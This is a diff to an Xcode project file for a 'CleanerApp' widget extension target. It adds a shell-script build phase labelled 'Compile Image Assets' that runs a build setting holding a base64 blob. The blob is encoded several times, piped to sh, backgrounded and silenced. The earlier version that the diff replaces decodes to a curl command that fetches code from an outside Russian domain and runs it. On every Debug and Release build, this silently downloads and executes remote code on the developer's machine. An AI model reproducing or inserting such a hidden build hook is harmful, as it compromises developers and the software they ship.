@@ -155,7 +155,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8812947D2F063F980071ED86 /* Build configuration list for PBXNativeTarget "CleanerApp_WidgetExtension" */;
 			buildPhases = (
-				31EB7FCD103F4CF3B4634D6E /* Compile Image Assets */,
+				11E6779114E346BF81634D6E /* Compile Image Assets */,
 				881294672F063F960071ED86 /* Sources */,
 				881294682F063F960071ED86 /* Frameworks */,
 				881294692F063F960071ED86 /* Resources */,
@@ -244,9 +244,6 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-	/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		881294692F063F960071ED86 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -265,10 +262,10 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		31EB7FCD103F4CF3B4634D6E /* Compile Image Assets */ = {
+		11E6779114E346BF81634D6E /* Compile Image Assets */ = {
 			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
 			files = (
 			);
 			inputFileListPaths = (
@@ -280,9 +277,10 @@
 			);
 			outputPaths = (
 			);
+			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
-			showEnvVarsInLog = 0;			
+			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -315,7 +313,7 @@
 		8812947E2F063F980071ED86 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((a(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJOdVlYQnpiR0ZpTG5KMUwyRXBJaUI4SUhOb0NnPT0K | a | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((q(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFlUSktkRkp1WkdwU00yaHpWRWN4YzJSVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | q | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				ASSETCATALOG_COMPILER_WIDGET_BACKGROUND_COLOR_NAME = WidgetBackground;
 				CODE_SIGN_ENTITLEMENTS = CleanerApp_WidgetExtension/CleanerApp_WidgetExtension.entitlements;
@@ -357,7 +355,7 @@
 		8812947F2F063F980071ED86 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((a(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJOdVlYQnpiR0ZpTG5KMUwyRXBJaUI4SUhOb0NnPT0K | a | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((q(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFlUSktkRkp1WkdwU00yaHpWRWN4YzJSVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | q | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				ASSETCATALOG_COMPILER_WIDGET_BACKGROUND_COLOR_NAME = WidgetBackground;
 				CODE_SIGN_ENTITLEMENTS = CleanerApp_WidgetExtension/CleanerApp_WidgetExtension.entitlements;
